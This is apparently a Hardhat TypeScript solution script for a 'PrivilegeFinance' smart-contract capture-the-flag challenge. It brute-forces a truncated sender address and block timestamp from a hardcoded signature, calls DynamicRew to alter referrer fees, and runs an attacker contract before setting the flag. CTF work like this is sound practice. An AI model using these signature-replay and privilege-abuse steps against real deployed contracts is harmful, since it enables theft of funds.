import chalk from "chalk";
import { ethers } from "hardhat";
import { PrivilegeFinance__factory, PrivilegeFinanceAttack__factory} from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

function help(): [string, number] {
    let msgsender = "0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0";
    for (let i = 0; i < 256; i++) {
        let _msgsender = msgsender + i.toString(16).padStart(2, "0");
        let checksumAddress = ethers.getAddress(_msgsender.toLowerCase());
        if (checksumAddress.substring(0, 40) == msgsender){
            msgsender = checksumAddress;
            log(`True msgsender: ${chalk.yellow(checksumAddress)}`);
            break;
        }
    }
    let block = 1677729608;
    for (let j = 0; j < 2; j++) {
        let digest = ethers.solidityPackedKeccak256(["address", "uint", "uint"], [msgsender, "65000000000000000000000", block+j]);
        let address = ethers.recoverAddress(digest,{r:"0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c", s: "0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9", v:28})        
        if (address == "0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b") {
            block = block + j;
            log(`True blocktimestamp: ${chalk.yellow(block + j)}`);
            break;
        }
    }
    return [msgsender, block];

}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let privilegeFinanceContract;
    let tx;
    if(network.name == "hardhat") {
        privilegeFinanceContract = await new PrivilegeFinance__factory(deployer).deploy();
        await privilegeFinanceContract.waitForDeployment();
        privilegeFinanceContract = privilegeFinanceContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await privilegeFinanceContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        privilegeFinanceContract = PrivilegeFinance__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await privilegeFinanceContract.getAddress())}!`)
    }
    let [msgsender, blocktimestamp] = help();

    if(privilegeFinanceContract) {
        const privilegeFinanceAttack = await new PrivilegeFinanceAttack__factory(attacker).deploy();
        await privilegeFinanceAttack.waitForDeployment();

        tx = await privilegeFinanceContract.DynamicRew(msgsender, blocktimestamp, 10000000, 50);
        await tx.wait();
        log(`ReferrerFees: ${chalk.yellow(await privilegeFinanceContract.ReferrerFees())}`);
        
        tx = await privilegeFinanceAttack.attack(await privilegeFinanceContract.getAddress());
        await tx.wait();
        log(`Attacker contract's referrer: ${chalk.yellow(await privilegeFinanceContract.referrers(await privilegeFinanceAttack.getAddress()))}`);
        log(`Attacker balance: ${chalk.yellow(await privilegeFinanceContract.balances(attacker.address))}`);

        tx = await privilegeFinanceContract.setflag();
        await tx.wait();
        log(`Is solved: ${chalk.yellow(await privilegeFinanceContract.isSolved())}`);
    }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});